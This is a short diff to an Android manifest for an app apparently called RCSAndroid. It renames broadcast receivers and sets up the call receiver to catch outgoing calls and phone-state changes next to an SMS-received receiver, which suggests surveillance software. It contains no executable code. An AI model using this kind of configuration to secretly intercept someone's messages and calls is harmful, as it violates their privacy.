@@ -42,23 +42,25 @@
 		<receiver android:name="com.ht.RCSAndroidGUI.listener.BatteryMonitor">
 		</receiver>
 		
-		<receiver android:name="broadcast.AcBroadcastMonitor">
+		<receiver android:name="com.ht.RCSAndroidGUI.listener.BroadcastMonitorAc">
 		</receiver>
 		
-		<receiver android:name="broadcast.StandbyBroadcastMonitor">
+		<receiver android:name="com.ht.RCSAndroidGUI.listener.BroadcastMonitorStandby">
 		</receiver>
 		
-		<receiver android:name="broadcast.SmsBroadcastMonitor">
+		<receiver android:name="com.ht.RCSAndroidGUI.listener.BroadcastMonitorSms">
 			<intent-filter>
-				<action android:name= "android.provider.Telephony.SMS_RECEIVED" />
+				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
 		</receiver>
-		
-		<receiver android:name="broadcast.CallBroadcastMonitor">
-			<intent-filter>
-				<action android:name= "android.intent.action.PHONE_STATE" />
+
+       	<receiver android:name="com.ht.RCSAndroidGUI.listener.BroadcastMonitorCall" android:exported="true">
+            <intent-filter android:priority="0">
+            	<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            	<action android:name="android.intent.action.PHONE_STATE" />
+            	<category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
-		</receiver>
+        </receiver> 
 		
 	    <service android:name="RCSAndroid">
 			<intent-filter>
